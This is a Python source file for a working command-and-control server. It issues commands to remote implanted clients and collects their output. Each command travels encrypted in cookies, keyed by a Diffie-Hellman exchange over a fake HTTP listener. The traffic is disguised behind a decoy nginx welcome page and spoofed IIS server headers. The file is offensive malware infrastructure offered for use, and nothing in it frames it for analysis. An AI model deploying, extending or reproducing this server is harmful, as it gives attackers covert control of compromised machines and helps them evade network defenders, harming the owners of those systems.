from bottle import get, post, error, request, response, run
import uuid
import json
import os
import tailer
import base64
import socket
import threading
import datetime
import pyaes
from diffiehellman.diffiehellman import DiffieHellman



TEMP_FILES_PATH = "/tmp/c2server/"
REPORT_FILES_PATH = os.path.join(TEMP_FILES_PATH, "reports")
SESSION_KEY_FILES_PATH = os.path.join(TEMP_FILES_PATH, "keys")
COMMAND_FILES_PATH = os.path.join(TEMP_FILES_PATH, "commands")

class Main:
    """
    This class is the entry point for the C&C server.
    This server should be run as a service (daemon) on a publicly accessible server in the cloud.
    """

    def __init__(self):
        try:
            os.makedirs(REPORT_FILES_PATH)
            os.makedirs(COMMAND_FILES_PATH)
            os.makedirs(SESSION_KEY_FILES_PATH)
        except:
            pass

    def _handle_client_connection(self, client_socket, address):
        try:
            tcp_request = client_socket.recv(4096)
            str_req = tcp_request.decode()

            #Parsing this "Stateful HTTP" request
            req_lines = str_req.split("\n")
            req_method = req_lines[0].split(" ")[0]
            req_uri = req_lines[0].split(" ")[1]
            req_cookie_name = req_lines[4].split(": ", maxsplit=2)[1].split(":", maxsplit=2)[0]
            req_cookie_value = req_lines[4].split(": ", maxsplit=2)[1].split(":", maxsplit=2)[1]

            client_id = req_cookie_name
            client_dh_pubkey = int(base64.b64decode(req_cookie_value).decode())

            dh = DiffieHellman(key_length=32)
            dh.generate_public_key()
            dh.generate_shared_secret(other_public_key=client_dh_pubkey, echo_return_key=True)
            server_dh_pubkey = dh.public_key
            session_key = dh.shared_secret

            filename = os.path.join(SESSION_KEY_FILES_PATH, client_id + ".key")
            key = {
                "client_ip": address[0],
                "client_id": client_id,
                "dh_key": dh.shared_secret,
                "session_key": str(session_key)[0:32],
                "server_dh_pubkey": server_dh_pubkey
            }

            cmd_file = open(filename, "w")
            cmd_file.write(json.dumps(key) + "\n")
            cmd_file.close()

            #Build a "Stateful HTTP" response
            http_resp = "\n".join([
                "HTTP/1.0 200 OK",
                "Date: " + datetime.datetime.now().strftime("%a, %d %b %Y %H:%M:%S %Z"),
                "Content-Length: 0",
                "Server: Microsoft-IIS/6.0",
                "Content-Type: text/html; charset=UTF-8",
                "Set-Cookie: " + str(client_id) + "=" + base64.b64encode(str(server_dh_pubkey).encode()).decode(),
                " ",
                "<!DOCTYPE html>",
                "<html>",
                "<head>",
                "<title>Welcome to nginx!</title>",
                "<style>",
                "    body {",
                "        width: 35em;",
                "        margin: 0 auto;",
                "        font-family: Tahoma, Verdana, Arial, sans-serif;",
                "    }",
                "</style>",
                "</head>",
                "<body>",
                "<h1>Welcome to nginx!</h1>",
                "<p>If you see this page, the nginx web server is successfully installed and",
                "working. Further configuration is required.</p>",
                "",
                "<p>For online documentation and support. refer to",
                "<a href=\"http://nginx.org/\">nginx.org</a>.<br/>",
                "Commercial support is available at",
                "<a href=\"http://nginx.com/\">nginx.com</a>.</p>",
                "",
                "<p><em>Thank you for using nginx.</em></p>",
                "</body>",
                "</html>"
            ])
            client_socket.sendall(http_resp.encode())
        except Exception as ex:
            try:
                http_resp = "\n".join([
                    "HTTP/1.0 404 NOT FOUND",
                    "Date: " + datetime.datetime.now().strftime("%a, %d %b %Y %H:%M:%S %Z"),
                    "Content-Length: 0",
                    "Server: Microsoft-IIS/6.0",
                ])
                client_socket.sendall(http_resp.encode())
            except:
                pass
        try:
            client_socket.close()
        except:
            pass

    def _run_bottle(self, host, bottle_port):
        run(host=host, port=bottle_port)

    def _run_tcp_listener(self, host, tcp_port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, tcp_port))
        server.listen(50)

        while True:
            client_sock, address = server.accept()
            client_handler = threading.Thread(
                target=self._handle_client_connection,
                args=(client_sock, address,)
                # without comma you'd get a... TypeError: handle_client_connection() argument after * must be a sequence, not _socketobject
            )
            client_handler.start()


    def _run(self, host, bottle_port, tcp_port):
        #Launching the "stateful HTTP" listener for handling Diffie-Hellman negotiation
        threading.Thread(
            target=self._run_tcp_listener,
            args=(host, tcp_port,)
        ).start()

        #Launching the bottle HTTP listener for accepting client connections for getting commands to run and reporting their output
        self._run_bottle(host, bottle_port)


    @get('/<random>/<client_id>/')
    def get_command(random, client_id):
        client_ip = request.environ.get('REMOTE_ADDR')
        filename = os.path.join(COMMAND_FILES_PATH, client_id + ".cmd")
        command = {
            "client_ip": client_ip,
            "client_id": client_id,
            "command": "hostname",
            "args": "",
            "id": uuid.uuid4().hex
        }

        if os.path.isfile(filename):
            cmd_file = open(filename, "r")
            json_lines = tailer.tail(cmd_file, 1)
            command = json.loads(json_lines[0])
        else:
            cmd_file = open(filename, "w")
            cmd_file.write(json.dumps(command) + "\n")
            cmd_file.close()

        try:
            #Encryption
            filename = os.path.join(SESSION_KEY_FILES_PATH, client_id + ".key")
            key_info_file = open(filename, "r")
            key_file_contents = "\n".join(key_info_file.readlines())
            key_info = json.loads(key_file_contents)
            key_info_file.close()
            encryptor = pyaes.AESModeOfOperationCTR(key=key_info["session_key"].encode("utf-8"))
            command2run = base64.b64encode(encryptor.encrypt(json.dumps(command).encode("utf-8"))).decode("utf-8")

        except:
            command2run = base64.b64encode(json.dumps(command).encode("utf-8")).decode("utf-8")

        response.set_cookie(client_id, command2run)
        response.headers.replace("Server", "Microsoft-IIS/6.0")

        return "\n".join([
            command2run,
            "<!DOCTYPE html>",
            "<html>",
            "<head>",
            "<title>Welcome to nginx!</title>",
            "<style>",
            "    body {",
            "        width: 35em;",
            "        margin: 0 auto;",
            "        font-family: Tahoma, Verdana, Arial, sans-serif;",
            "    }",
            "</style>",
            "</head>",
            "<body>",
            "<h1>Welcome to nginx!</h1>",
            "<p>If you see this page, the nginx web server is successfully installed and",
            "working. Further configuration is required.</p>",
            "",
            "<p>For online documentation and support. refer to",
            "<a href=\"http://nginx.org/\">nginx.org</a>.<br/>",
            "Commercial support is available at",
            "<a href=\"http://nginx.com/\">nginx.com</a>.</p>",
            "",
            "<p><em>Thank you for using nginx.</em></p>",
            "</body>",
            "</html>"
        ])

    @post('/<random>/<client_id>/<command_hash_arg_id>/')
    def post_response(random, client_id, command_hash_arg_id):
        command_hash = request.query[command_hash_arg_id]
        command_result_b64 = base64.b64decode(request.get_cookie(client_id)).decode("utf-8")
        try:
            #Decryption
            filename = os.path.join(SESSION_KEY_FILES_PATH, client_id + ".key")
            key_info_file = open(filename, "r")
            key_file_contents = "\n".join(key_info_file.readlines())
            key_info = json.loads(key_file_contents)
            key_info_file.close()
            decryptor = pyaes.AESModeOfOperationCTR(key=key_info["session_key"].encode("utf-8"))

            command_hash = decryptor.decrypt(base64.b64decode(command_hash)).decode("utf-8")
        except Exception as ex:
            pass

        client_ip = request.environ.get('REMOTE_ADDR')
        filename = os.path.join(REPORT_FILES_PATH, client_id + "-" + command_hash.replace("/", "_") + ".rep")
        report = {
            "client_ip": client_ip,
            "client_id": client_id,
            "command_hash": command_hash,
            "result_base64": command_result_b64
        }

        cmd_file = open(filename, "w")
        cmd_file.write(json.dumps(report) + "\n")
        cmd_file.close()
        response.headers.replace("Server", "Microsoft-IIS/6.0")

        return "\n".join([
            "<!DOCTYPE html>",
            "<html>",
            "<head>",
            "<title>Welcome to nginx!</title>",
            "<style>",
            "    body {",
            "        width: 35em;",
            "        margin: 0 auto;",
            "        font-family: Tahoma, Verdana, Arial, sans-serif;",
            "    }",
            "</style>",
            "</head>",
            "<body>",
            "<h1>Welcome to nginx!</h1>",
            "<p>If you see this page, the nginx web server is successfully installed and",
            "working. Further configuration is required.</p>",
            "",
            "<p>For online documentation and support. refer to",
            "<a href=\"http://nginx.org/\">nginx.org</a>.<br/>",
            "Commercial support is available at",
            "<a href=\"http://nginx.com/\">nginx.com</a>.</p>",
            "",
            "<p><em>Thank you for using nginx.</em></p>",
            "</body>",
            "</html>"
        ])

    @error(404)
    def error_hnd(error):
        response.headers.replace("Server", "Microsoft-IIS/6.0")
        return


Main()._run("0.0.0.0", 8080, 8081)